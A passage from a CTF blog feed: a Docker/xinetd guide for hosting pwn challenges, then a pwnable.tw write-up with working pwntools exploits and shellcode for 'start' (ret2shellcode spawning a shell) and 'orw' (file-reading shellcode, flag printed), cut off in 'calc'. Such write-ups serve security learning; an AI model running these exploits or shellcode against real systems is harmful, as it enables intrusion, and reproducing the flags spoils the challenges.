      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Learning Docker</title>
    <link href="http://siriuswhiter.tk/2018/11/10/learning-docker/"/>
    <id>http://siriuswhiter.tk/2018/11/10/learning-docker/</id>
    <published>2018-11-10T03:27:22.000Z</published>
    <updated>2018-11-10T08:34:21.443Z</updated>
    
    <content type="html"><![CDATA[<p><em>之前是为了学习搭pwn题的环境稍微碰了下docker，但是因为kali上的gdb被我搞得问题很大，再加上不能完全卸载重装，索性想着搞一个pwn工具的集成环境，一劳永逸，docker无疑是个好东西，顺便也记录下搭建pwn题的过程吧</em></p><h1 id="pwn环境部署"><a href="#pwn环境部署" class="headerlink" title="pwn环境部署"></a>pwn环境部署</h1><p>  最基础的方法是socat， <code>socat tcp-l:9999,fork exec:./pwn1</code><br>  没有timeout，连得人多多半就爆炸了</p><p>所以选择：<br><code>xinted + docker</code></p><h2 id="xinted"><a href="#xinted" class="headerlink" title="xinted"></a>xinted</h2><p><a href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener">xinted</a>从权限到服务配置都做好了一个dockerfile,build即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Eadom/ctf_xinetd.git</span><br></pre></td></tr></table></figure><h2 id="docker-安装"><a href="#docker-安装" class="headerlink" title="docker 安装"></a>docker 安装</h2><p> 因为没有用ubuntu，kali等其他的debian系等等没法直接 <code>sudo apt-get install docker-ce</code></p><p>kali最后成功安装docker的方法：</p><p>在/etc/apt/sources.list 中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http://http.debian.net/debian jessie-backports main</span><br></pre></td></tr></table></figure><p>更新源并安装即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update   </span><br><span class="line">apt-get install docker.io</span><br></pre></td></tr></table></figure><h2 id="配置docker环境"><a href="#配置docker环境" class="headerlink" title="配置docker环境"></a>配置docker环境</h2><ul><li>将bin文件放置到bin目录下</li><li>修改flag内容</li><li>修改ctf.xinted的服务：<br>port = 指定端口<br>server_args = –userspec=1000:1000 /home/ctf ./binname</li></ul><h2 id="build-dockerfile"><a href="#build-dockerfile" class="headerlink" title="build dockerfile"></a>build dockerfile</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t &quot;binname&quot; . </span><br><span class="line">docker run -d -p &quot;0.0.0.0:9999:9999&quot; -h &quot;biname&quot; --name=&quot;binname&quot; binname</span><br></pre></td></tr></table></figure><p>将镜像跑起来就ok了</p><h1 id="pwn-docker"><a href="#pwn-docker" class="headerlink" title="pwn docker"></a>pwn docker</h1><p>一个集成pwn常用工具的docker，暂时用的是<a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">pwndocker</a>,不过比较臃肿，之后再自己搭建一个</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><em>一般刚开机docker未打开，使用<code>service docker start</code>打开服务</em></p><ol><li><code>pull</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull skysider/pwndocker</span><br></pre></td></tr></table></figure><ol start="2"><li><code>docker images</code> 可以看到已经在仓库里了</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/pwn/docker# docker images</span><br><span class="line">REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">skysider/pwndocker   latest              a24dde07a423        6 days ago          2.02GB</span><br></pre></td></tr></table></figure><p>各项含义：</p><pre><code>REPOSITORY：表示镜像的仓库源TAG：镜像的标签IMAGE ID：镜像IDCREATED：镜像创建时间SIZE：镜像大小</code></pre><ol start="3"><li><code>docker run -t -i skysider/pwndocker</code>直接进入bash</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/pwn/docker# docker run -t -i skysider/pwndocker</span><br><span class="line">root@b11ff1440061:/ctf/work#</span><br></pre></td></tr></table></figure><pre><code>*b11ff1440061 是container的id*</code></pre><ol start="4"><li>外部文件要往container里复制，使用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp /path/file b11ff1440061: /path</span><br></pre></td></tr></table></figure><p>当然b11ff1440061 换成container的id</p><ol start="5"><li>因为别人的docker工具不一定适合自己，需要自己再安装什么的，但是一般安装完退出后就又没有了，当然不能每次都重装</li></ol><p>有两种办法：</p><ul><li>在container中安装完以后，exit</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit  b11ff1440061 pwndocker</span><br></pre></td></tr></table></figure><p>同时可以使用</p><p>-m 来指定提交的说明信息，跟我们使用的版本控制一样<br>-a 可以指定更新的用户信息<br>之后是用来创建镜像容器的id 最后指定目标镜像仓库名和tag信息</p><p>这样可以将修改完的另存为新的image</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~# docker images</span><br><span class="line">REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">pwndocker            latest              7c0fa09ee004        12 seconds ago      2.05GB</span><br><span class="line">skysider/pwndocker   latest              a24dde07a423        6 days ago          2.02GB</span><br></pre></td></tr></table></figure><ul><li>使用dockerfile重新build</li></ul><p>像这里可以举例，编辑dockerfile：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM skysider/pwndocker</span><br><span class="line"></span><br><span class="line">RUN apt-get install vim</span><br></pre></td></tr></table></figure><p>From 指定镜像源<br>RUN 指令告诉docker 在镜像内执行命令，安装了什么。。<br>EXPOSE 可以指定开放端口</p><p>编辑完后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t pwndocker .</span><br></pre></td></tr></table></figure></p><p>按理说这样子就可以了。。但是我这里会有个报错<code>The command &#39;/bin/sh -c apt-get install vim&#39; returned a non-zero code: 1</code>仍未解决</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;之前是为了学习搭pwn题的环境稍微碰了下docker，但是因为kali上的gdb被我搞得问题很大，再加上不能完全卸载重装，索性想着搞一个pwn工具的集成环境，一劳永逸，docker无疑是个好东西，顺便也记录下搭建pwn题的过程吧&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;p
      
    
    </summary>
    
      <category term="skills" scheme="http://siriuswhiter.tk/categories/skills/"/>
    
    
      <category term="skills" scheme="http://siriuswhiter.tk/tags/skills/"/>
    
      <category term="docker" scheme="http://siriuswhiter.tk/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw-wp</title>
    <link href="http://siriuswhiter.tk/2018/11/06/pwnable-tw-wp/"/>
    <id>http://siriuswhiter.tk/2018/11/06/pwnable-tw-wp/</id>
    <published>2018-11-06T11:37:08.000Z</published>
    <updated>2018-12-29T01:13:55.114Z</updated>
    
    <content type="html"><![CDATA[<p><em>好久没碰pwn了，找找感觉</em><br><em>pwnable.tw网站的题都进不去，审查元素竟然没见到button响应？？于是就在源码里找题的文件源码保存下来，苟且做题</em></p><h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>见到的最轻巧的一个题</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">func main()</span><br><span class="line">push    esp</span><br><span class="line">; 4:   result = 3;</span><br><span class="line">push    offset _exit</span><br><span class="line">xor     eax, eax</span><br><span class="line">; 5:   __asm</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">xor     edx, edx</span><br><span class="line">push    &apos;:FTC&apos;</span><br><span class="line">push    &apos; eht&apos;</span><br><span class="line">push    &apos; tra&apos;</span><br><span class="line">push    &apos;ts s&apos;</span><br><span class="line">push    2774654Ch</span><br><span class="line">mov     ecx, esp        ; addr</span><br><span class="line">mov     dl, 14h         ; len</span><br><span class="line">mov     bl, 1           ; fd</span><br><span class="line">mov     al, 4</span><br><span class="line">int     80h             ; LINUX - sys_write</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     dl, 60</span><br><span class="line">mov     al, 3</span><br><span class="line">int     80h             ; LINUX -</span><br><span class="line">add     esp, 14h</span><br><span class="line">retn</span><br><span class="line"></span><br><span class="line">func exit()</span><br><span class="line">pop     esp</span><br><span class="line">xor     eax, eax</span><br><span class="line">inc     eax</span><br><span class="line">int     80h</span><br></pre></td></tr></table></figure><p>以上为所有的代码。。。 可以看出先使用系统调用write到屏幕，然后又调用read，调用完退出</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>大致推测应该要使用ret2shellcode,一共可以输入60长度的字符，20个就会溢出，所以想着将shellcode放在返回地址之后。<br>看了一下pwntools自带的shellcraft长度也有44。。。所以需要自己写或者在shellstorm上找一找符合要求的。<br>不知道栈地址，所以需要第一次将返回地址覆盖为之前的mov ecx,esp地址，write输出泄露输入的起始地址。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./start&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;,10000)</span><br><span class="line"></span><br><span class="line">shellcode =&quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot; </span><br><span class="line">print len(shellcode)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*20 + p32(0x8048087) </span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(pay)</span><br><span class="line">leak_addr = u32(sh.recv(4))</span><br><span class="line">print hex(leak_addr)</span><br><span class="line"></span><br><span class="line">esp_addr = leak_addr + 0x14</span><br><span class="line">pay = &apos;a&apos;*20 + p32(esp_addr) + shellcode</span><br><span class="line">sh.send(pay) </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10000: Done</span><br><span class="line">21</span><br><span class="line">0xff936bc0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\x00\x00\x005o\x93\xff\x00\x00\x00\x00Go\x93\xff</span><br><span class="line">$ whoami</span><br><span class="line">start</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><p>贼鸡儿诡异的一道题，回头发现题目名字很有深意 orw –&gt; open read write</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  printf(&quot;Give my your shellcode:&quot;);</span><br><span class="line">  read(0, &amp;shellcode, 0xC8u);</span><br><span class="line">  ((void (*)(void))shellcode)();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">orw_seccomp():</span><br><span class="line">unsigned int orw_seccomp()</span><br><span class="line">&#123;</span><br><span class="line">  __int16 v1; // [esp+4h] [ebp-84h]</span><br><span class="line">  char *v2; // [esp+8h] [ebp-80h]</span><br><span class="line">  char v3; // [esp+Ch] [ebp-7Ch]</span><br><span class="line">  unsigned int v4; // [esp+6Ch] [ebp-1Ch]</span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(0x14u);</span><br><span class="line">  qmemcpy(&amp;v3, &amp;unk_8048640, 0x60u);</span><br><span class="line">  v1 = 12;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(38, 1, 0, 0, 0);                        // 38 PR_SET_NO_NEW_PRIVS</span><br><span class="line">                                                //               将调用线程的no_new_privs位设置为值</span><br><span class="line">                                                //               ARG2。将no_new_privs设置为1，execve（2）承诺不会</span><br><span class="line">                                                //               授予执行任何无法完成的任务的权限</span><br><span class="line">                                                //               没有execve（2）调用（例如，渲染集合 - </span><br><span class="line">                                                //               user-ID和set-group-ID模式位，以及非文件功能</span><br><span class="line">                                                //               功能性的）。设置后，该位不能取消设置。那个设定</span><br><span class="line">                                                //               这个位是由fork（2）和</span><br><span class="line">                                                //               克隆（2），并保存在execve（2）。</span><br><span class="line">                                                // </span><br><span class="line">  prctl(22, 2, &amp;v1);                            // 22 PR_SET_SECCOMP  </span><br><span class="line">                                                //   seccomp是一种内核中的安全机制,正常情况下,程序可以使用所有的syscall,       这是不安全的,</span><br><span class="line">                                                // 比如劫持程序流后通过execve的syscall来getshell.通过seccomp我们可以在程序中禁用掉某些syscall,这样就算劫持了程序流也只能调用部分的syscall了.</span><br><span class="line">                                                // 大概是终结了系统调用的可能,也就很难getshell了。</span><br><span class="line">  return __readgsdword(0x14u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>题目直接让输入shellcode，之后执行，仿佛很简单，但是orw_seccomp()这个函数里有一些奇奇怪怪的东西<br>看到了prctl函数。。。查了一些资料，看第一个的时候还以为是fork爆破canary，第二个查完发现应该是有一些特殊的点切入。</p><p>这块可以参考<br><a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h</a><br><a href="http://man7.org/linux/man-pages/man2/prctl.2.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man2/prctl.2.html</a></p><p>因为看不了题，不过在源码里能看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">             &lt;!-- description --&gt;</span><br><span class="line">               </span><br><span class="line">              &lt;div class=&quot;description&quot; hidden&gt;&lt;p&gt;Read the flag from &lt;code&gt;/home/orw/flag&lt;/code&gt;.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Only &lt;code&gt;open&lt;/code&gt; &lt;code&gt;read&lt;/code&gt; &lt;code&gt;write&lt;/code&gt; syscall are allowed to use.&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>这个描述给了切入点hhhh，也就是需要这三个系统调用来得到flag嘛</p><figure class="image-box">                <img src="/2018/11/06/pwnable-tw-wp/sys_call.png" alt="" 系统调用""="" title="" class="">                <p>"系统调用"</p>            </figure><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>简直就是汇编实习现场了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./orw&apos;)</span><br><span class="line">sh = remote(&quot;chall.pwnable.tw&quot;,10001)</span><br><span class="line"></span><br><span class="line">shellcode=&apos;&apos;&apos;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">push &#123;&#125;;</span><br><span class="line">mov ebx,esp;</span><br><span class="line">xor ecx,ecx;</span><br><span class="line">xor edx,edx;</span><br><span class="line">xor eax,eax;</span><br><span class="line">mov al,0x5;</span><br><span class="line">int 0x80;                    //open</span><br><span class="line"></span><br><span class="line">mov ebx,eax;</span><br><span class="line">xor eax,eax;</span><br><span class="line">mov al,0x3;</span><br><span class="line">mov ecx,esp;</span><br><span class="line">mov dl,0x30;</span><br><span class="line">int 0x80;                    //read</span><br><span class="line"></span><br><span class="line">mov al,0x4;</span><br><span class="line">mov bl,1;</span><br><span class="line">mov dl,0x30;</span><br><span class="line">int 0x80;                     //write</span><br><span class="line">&apos;&apos;&apos;.format(hex(u32(&apos;ag&apos;+chr(0)+chr(0))),hex(u32(&apos;w/fl&apos;)),hex(u32(&apos;e/or&apos;)),hex(u32(&apos;/hom&apos;)))</span><br><span class="line"></span><br><span class="line">sh.sendline(asm(shellcode))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10001: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Give my your shellcode:FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;</span><br><span class="line">�u�\x0[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p>前面还一对代码说题目干净，这个题就开始一堆代码了。。。</p><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">unsigned int calc()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+18h] [ebp-5A0h]</span><br><span class="line">  int v2[100]; // [esp+1Ch] [ebp-59Ch]</span><br><span class="line">  char s; // [esp+1ACh] [ebp-40Ch]</span><br><span class="line">  unsigned int v4; // [esp+5ACh] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(0x14u);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    bzero(&amp;s, 0x400u);                          // 置字节字符串前n个字节为零且包括‘\0’。 </span><br><span class="line">    if ( !get_expr((int)&amp;s, 1024) )</span><br><span class="line">      break;</span><br><span class="line">    init_pool(&amp;v1);                            //初始化v1</span><br><span class="line">    if ( parse_expr((int)&amp;s, &amp;v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      printf((const char *)&amp;_d, v2[v1 - 1]);</span><br><span class="line">      fflush(stdout);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">init_pool():</span><br><span class="line"></span><br><span class="line">_DWORD *__cdecl init_pool(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // eax</span><br><span class="line">  signed int i; // [esp+Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  *a1 = 0;</span><br><span class="line">  for ( i = 0; i &lt;= 99; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = a1;</span><br><span class="line">    a1[i + 1] = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">signed int __cdecl parse_expr(int a1, _DWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // ST2C_4</span><br><span class="line">  int v4; // eax</span><br><span class="line">  int v5; // [esp+20h] [ebp-88h]</span><br><span class="line">  int i; // [esp+24h] [ebp-84h]</span><br><span class="line">  int O; // [esp+28h] [ebp-80h]</span><br><span class="line">  char *s1; // [esp+30h] [ebp-78h]</span><br><span class="line">  int num_left; // [esp+34h] [ebp-74h]</span><br><span class="line">  char s[100]; // [esp+38h] [ebp-70h]</span><br><span class="line">  unsigned int v11; // [esp+9Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(0x14u);</span><br><span class="line">  v5 = a1;</span><br><span class="line">  O = 0;</span><br><span class="line">  bzero(s, 0x64u);</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(char *)(i + a1) - &apos;0&apos; &gt; (unsigned int)&apos;\t&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = i + a1 - v5;</span><br><span class="line">      s1 = (char *)malloc(v2 + 1);</span><br><span class="line">      memcpy(s1, v5, v2);</span><br><span class="line">      s1[v2] = 0;</span><br><span class="line">      if ( !strcmp(s1, &quot;0&quot;) )                   // 输入不能为0</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;prevent division by zero&quot;);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      num_left = atoi(s1);</span><br><span class="line">      if ( num_left &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (*a2)++;                      // v4为操作数数目</span><br><span class="line">        a2[v4 + 1] = num_left;             // 操作数放入a2[1],a2[2],....</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      if ( *(_BYTE *)(i + a1) &amp;&amp; *(char *)(i + 1 + a1) - &apos;0&apos; &gt; (unsigned int)&apos;\t&apos; )   // 若下一个操作数仍未操作符即报错</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;expression error!&quot;);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      v5 = i + 1 + a1;</span><br><span class="line">      if ( s[O] )                               // s[0]为操作数数目</span><br><span class="line">      &#123;</span><br><span class="line">        switch ( *(char *)(i + a1) )</span><br><span class="line">        &#123;</span><br><span class="line">          case &apos;%&apos;:</span><br><span class="line">          case &apos;*&apos;:</span><br><span class="line">          case &apos;/&apos;:</span><br><span class="line">            if ( s[O] != &apos;+&apos; &amp;&amp; s[O] != &apos;-&apos; )</span><br><span class="line">            &#123;</span><br><span class="line">              eval(a2, s[O]);</span><br><span class="line">              s[O] = *(_BYTE *)(i + a1);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">              s[++O] = *(_BYTE *)(i + a1);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">          case &apos;+&apos;:</span><br><span class="line">          case &apos;-&apos;:</span><br><span class="line">            eval(a2, s[O]);</span><br><span class="line">            s[O] = *(_BYTE *)(i + a1);</span><br><span class="line">            break;</span><br><span class="line">          default:</span><br><span class="line">            eval(a2, s[O--]);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        s[O] = *(_BYTE *)(i + a1);</span><br><span class="line">      &#125;</span><br><span class="line">      if ( 